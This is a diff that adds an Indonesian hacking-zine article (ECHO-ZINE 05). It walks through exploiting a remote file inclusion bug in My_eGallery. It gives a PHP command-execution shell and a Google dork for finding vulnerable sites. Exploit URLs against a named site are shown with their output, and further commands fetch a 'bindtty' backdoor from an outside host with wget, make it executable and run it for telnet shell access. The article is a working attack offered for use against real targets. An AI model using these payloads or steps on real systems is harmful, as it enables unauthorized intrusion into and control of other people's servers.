@@ -1,0 +1,127 @@
+    	____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       05
+
+Author: juventini || juventini@kalteng.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+My_eGallery Injection
+=====================
+Oleh:juventini
+
+Bug ini mungkin sudah agak lama, tapi sumpah masih banyak yg bisa kita
+mainkan hehhe..(itulah gunanya google kali yah). Bug ini terdapat pada
+"My_eGallery", pada dasarnya hal ini terjadi ketika "intruder"
+men-supply parameter(dalam bentuk kode php) pada My_eGallery site
+target melalui web site "intruder".
+
+=====Start PHP Code=========
+
+<?
+  // CMD - To Execute Command on File Injection Bug ( gif - jpg - txt )
+  if (isset($chdir)) @chdir($chdir);
+  ob_start();
+  execute("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
+  $output = ob_get_contents();
+  ob_end_clean();
+  print_output();
+?>
+
+==========End===============
+
+Nah..mari kita coba yah (mulai deh bagian menarik nya..hehehe),
+pertama-tama upload PHP code
+itu ke situs kamu(bisa dalam bentuk .txt). Atau kalo kamu males bisa
+kalian ambil dari
+http://www.geocities.com/java_sas/pascal.txt
+Ok..sekarang mari kita buka situs favorit saya "www.google.com" (found
+most everything here!!),
+lalu kita masukkan keyword nya : allinurl:my_eGallery site:.com (.com
+itu bisa diganti sesuai
+dgn keinginan kalian,.net,.id,.tv,etc)...Hasilnya...!!! banyak kan..hehehe
+
+Mari kita siapkan peralatan kita..apa yah? cuman browser kok, explorer
+atau netscape:) simpel
+kan? Nah kalo udah mari kita masukkan url yg kita dapatkan di google
+tadi dan kita gabungkan
+dengan letak php kode pada situs kita :
+
+ http://www.clontarfhc.com/modules/My_eGallery/public/displayCategory.php?
+ basepath=http://www.geocities.com/java_sas/pascal.txt?&cmd=uname%20-a
+
+mari kita amati dulu :
+*http://www.clontarfhc.com/modules/My_eGallery/public/displayCategory.php
+= adalah situs target dan direktori tempat my_eGallery
+
+*http://www.geocities.com/java_sas/pascal.txt = adalah site intruder
+dimana php kode tadi kita simpan
+*cmd=uname%20-a = apa mesti saya kasih tahu? hehehehe
+
+oke mari kita lihat apa yg browser hasilkan dari url tadi :
+
+Linux server1.fastsecurehost.com 2.4.22-1.2174.nptlsmp #1 SMP Wed Feb 18
+16:21:50 EST 2004 i686 i686 i386 GNU/Linux
+waaaaaaaaaaaaaaaaa..hehehe di excute euyyy command nya..!!lalu biar
+tambah menarik gimana kalo kita upload "bindtty" ke situs target,biar
+kita bisa melakukan telnet kesitu :)
+
+ http://www.clontarfhc.com/modules/My_eGallery/public/displayCategory.
+ php?basepath=http://www.geocities.com/java_sas/pascal.txt?&cmd=cd%20
+ /var/tmp%20;%20wget%20www.renjana.ws/~toa/bindtty
+
+perhatikan : cmd=cd%20/var/tmp%20;%20wget%20www.renjana.ws/~toa/bindtty
+mengingat kita bukan root maka upload file biasanya diperbolehkan di
+direktori /var/tmp, lalu tinggak di wget deh bindtty(disini saya ambil
+dari www.renjana.ws/~toa/bindtty)
+Lihat apa yg dihasilkan browser :
+
+--04:22:42-- http://www.renjana.ws/%7Etoa/bindtty
+           => `bindtty'
+Resolving www.renjana.ws... done.
+Connecting to www.renjana.ws[66.111.56.80]:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 19,380 [text/plain]
+
+    0K .......... ........ 100% 151.41 KB/s
+
+04:22:43 (151.41 KB/s) - `bindtty' saved [19380/19380]
+
+upssss...bisa euyyy :) 1/2 jalan neh udah hehehe..setelah bindtty telah
+tersimpan di situs target sekarang kita hanya perlu menjalankannya, tapi
+sebelumnya tentu saja kita ubah dulu permission nya:
+
+ http://www.clontarfhc.com/modules/My_eGallery/public/displayCategory.
+ php?basepath=http://www.geocities.com/java_sas/pascal.txt?&cmd=cd%20
+ /var/tmp%20;%20chmod%20755%20bindtty
+
+nah setelah ini baru deh bbisa kita running program bindtty nya :
+
+  http://www.clontarfhc.com/modules/My_eGallery/public/displayCategory
+  .php?basepath=http://www.geocities.com/java_sas/pascal.txt?&cmd=cd%20
+   /var/tmp%20;%20./bindtty
+
+Dan di browser kamu akan terlihat pid dari bindtty itu..hehehe..sudah
+jalan neh!! Sekarang buka deh telnet (kalo aku sih biasanya pake putty)
+telnet situs target di port 4000 (berhubung bindtty di
+www.renjana.ws/~toa/bindtty di set pada port 4000)
+Nah jadi lebih enak kalo di telnet..hehehe
+$bash id
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+ selanjutnya....? terserah anda donk...heheehhehe
+
+Itu dulu dari yah..selamat berpetualang!!!
+
+Penulis: juventini
+Email: juventini@kalteng.net
+Greetz to: My "Lovely" Girl (cit`z), all my "Tentor"(scut,pupet,etc),all
+echo staff,
+all my friends @Dalnet(aXal,mujie,Sitoboyan,C007,Banzai,etc),everybody
+who know me..!!
